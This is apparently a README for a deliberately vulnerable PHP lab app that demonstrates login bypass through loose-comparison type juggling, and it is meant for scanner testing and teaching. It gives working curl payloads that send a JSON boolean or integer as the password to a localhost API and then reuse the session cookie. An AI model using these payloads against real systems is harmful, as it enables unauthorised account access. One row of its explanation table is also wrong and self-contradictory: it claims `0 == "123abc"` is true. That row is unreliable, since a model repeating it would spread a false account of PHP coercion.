# PHP Auth Bypass — Type Juggling Demo

An **intentionally vulnerable** PHP application that demonstrates authentication bypass via PHP type juggling. Built for security scanner testing and educational purposes.

> **WARNING**: Do not deploy this application to any public or production environment. It contains deliberate security vulnerabilities.

## Quick Start

```bash
docker-compose up
```

Visit [http://localhost:8080](http://localhost:8080).

## Vulnerabilities

### 1. Boolean Type Juggling (`true == "any_string"`)

The JSON API endpoint uses `json_decode()` which preserves native JSON types. Combined with PHP's loose comparison (`==`), sending `true` as the password bypasses authentication because `true == "s3cur3P@ssw0rd!"` evaluates to `true`.

**Works on**: PHP 7.x and 8.x

```bash
curl -s -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":true}'
```

### 2. Integer Type Juggling (`0 == "non_numeric_string"`)

In PHP 7.x, comparing the integer `0` to a non-numeric string with `==` evaluates to `true` because PHP coerces the string to `0`.

**Works on**: PHP 7.x only (fixed in PHP 8.0)

```bash
curl -s -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":0}'
```

### Why It Works

PHP's `==` operator performs type coercion:

| Expression                     | Result  | Why                                    |
|-------------------------------|---------|----------------------------------------|
| `true == "s3cur3P@ssw0rd!"`  | `true`  | Any non-empty string is truthy         |
| `0 == "s3cur3P@ssw0rd!"`     | `true`  | String coerced to int 0 (PHP 7.x)     |
| `true == ""`                  | `false` | Empty string is falsy                  |
| `0 == "123abc"`               | `true`  | String starts with digits → int 123? No — PHP 7 coerces `"s3cur3..."` to `0` |

The fix is simple: use `===` (strict comparison) instead of `==`.

## File Structure

| File | Purpose |
|------|---------|
| `config.php` | Hardcoded credentials and session config |
| `index.php` | HTML login form (loose comparison, but POST values are strings) |
| `api/login.php` | JSON API login — **primary vulnerability** |
| `dashboard.php` | Protected page shown after successful login |
| `docker-compose.yml` | PHP 7.4 Apache container on port 8080 |

## Verification

1. Start the app: `docker-compose up`
2. Try the boolean bypass:
   ```bash
   curl -v -X POST http://localhost:8080/api/login.php \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":true}'
   ```
3. Confirm the response contains `"success": true` and a session ID.
4. Use the session cookie to access the dashboard:
   ```bash
   curl -b "PHPSESSID=<session_id_from_response>" http://localhost:8080/dashboard.php
   ```
